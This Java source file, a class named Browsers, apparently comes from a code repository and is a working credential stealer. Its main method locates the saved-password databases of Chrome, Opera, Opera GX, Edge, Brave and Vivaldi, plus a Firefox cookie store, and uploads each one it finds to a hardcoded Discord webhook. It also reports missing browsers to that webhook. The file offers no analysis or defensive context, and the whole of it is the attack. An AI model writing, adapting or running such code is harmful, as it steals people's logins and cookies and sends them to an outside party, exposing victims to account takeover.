package io.github.luxotick.impl;

import java.io.File;

import okhttp3.*;

public class Browsers {
    private final MediaType jsonMediaType = MediaType.parse("application/json; charset=utf-8");
    private final OkHttpClient httpClient;
    private final String webhookUrl;

    public Browsers(String webhookUrl) {
        this.webhookUrl = webhookUrl;
        this.httpClient = new OkHttpClient();
    }

    public void sendMessage(String message) {
        String json = "{\"content\":\"" + message + "\"}";
        RequestBody body = RequestBody.create(jsonMediaType, json);
        Request request = new Request.Builder()
                .url(webhookUrl)
                .post(body)
                .build();
        try {
            Response response = httpClient.newCall(request).execute();
            if (!response.isSuccessful()) {
                System.out.println("Failed to send message. Response code: " + response.code());
            }
        } catch (Exception e) {
            System.out.println("Failed to send message: " + e.getMessage());
        }
    }

    public static void main(String[] args) { // This is the main method
        String webhookUrl = "https://discord.com/api/webhooks/1087418861504172132/yENsvgIwE432aQ6ASMzTn2TcRYxwW_ZuKQqRE34aFsqg3I1QzaOwrbFjbgAWLyRJKD-T";

        String chromePath = (System.getProperty("user.home")) + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
        String operaPath = (System.getProperty("user.home")) + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data";
        String operaGXPath = (System.getProperty("user.home")) + "\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Login Data";
        String firefoxPath = (System.getProperty("user.home")) + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\avionrhy.default-release\\storage\\default\\moz_cookies.sqlite";
        String edgePath = (System.getProperty("user.home")) + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data";
        String bravePath = (System.getProperty("user.home")) + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data";
        String vivaldiPath = (System.getProperty("user.home")) + "\\AppData\\Local\\Vivaldi\\User Data\\Default\\Login Data";

        File chrome = new File(chromePath);
        File opera = new File (operaPath);
        File firefox = new File(firefoxPath);
        File operagx = new File(operaGXPath);
        File edge = new File(edgePath);
        File brave = new File(bravePath);
        File vivaldi = new File(vivaldiPath);

        try {
            OkHttpClient client = new OkHttpClient();
            MultipartBody.Builder builder = new MultipartBody.Builder()
            .setType(MultipartBody.FORM);

            if (chrome.exists()){
                builder.addFormDataPart("file1", chrome.getName() + " Chrome" , RequestBody.create(MediaType.parse("application/octet-stream"), chrome));
            }else {
                Browsers webhook = new Browsers(webhookUrl);
                webhook.sendMessage("Chrome not found");
            }
            if (opera.exists()){
                builder.addFormDataPart("file2", opera.getName() + " Opera", RequestBody.create(MediaType.parse("application/octet-stream"), opera));
            }else {
                Browsers webhook = new Browsers(webhookUrl);
                webhook.sendMessage("Opera not found");
            }
            if (firefox.exists()){
                builder.addFormDataPart("file3", firefox.getName() + " Firefox", RequestBody.create(MediaType.parse("application/octet-stream"), firefox));
            }else {
                Browsers webhook = new Browsers(webhookUrl);
                webhook.sendMessage("Firefox not found");
            }
            if (operagx.exists()){
                builder.addFormDataPart("file4", operagx.getName() + " OperaGX", RequestBody.create(MediaType.parse("application/octet-stream"), operagx));
            }else {
                Browsers webhook = new Browsers(webhookUrl);
                webhook.sendMessage("OperaGX not found");
            }
            if (edge.exists()){
                builder.addFormDataPart("file5", edge.getName() + " MicrosoftEdge", RequestBody.create(MediaType.parse("application/octet-stream"), edge));
            }else {
                Browsers webhook = new Browsers(webhookUrl);
                webhook.sendMessage("MicrosoftEdge not found");
            }
            if (brave.exists()){
                builder.addFormDataPart("file6", brave.getName() + " Brave", RequestBody.create(MediaType.parse("application/octet-stream"), brave));
            }else {
                Browsers webhook = new Browsers(webhookUrl);
                webhook.sendMessage("Brave not found");
            }
            if (vivaldi.exists()){
                builder.addFormDataPart("file7", vivaldi.getName() + " Vivaldi", RequestBody.create(MediaType.parse("application/octet-stream"), vivaldi));
            }else {
                Browsers webhook = new Browsers(webhookUrl);
                webhook.sendMessage("Vivaldi not found");
            }
            RequestBody requestBody = builder.build();

            Request request = new Request.Builder()
                    .url(webhookUrl)
                    .post(requestBody)
                    .addHeader("Content-Type", "multipart/form-data")
                    .build();
            Response response = client.newCall(request).execute();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
}
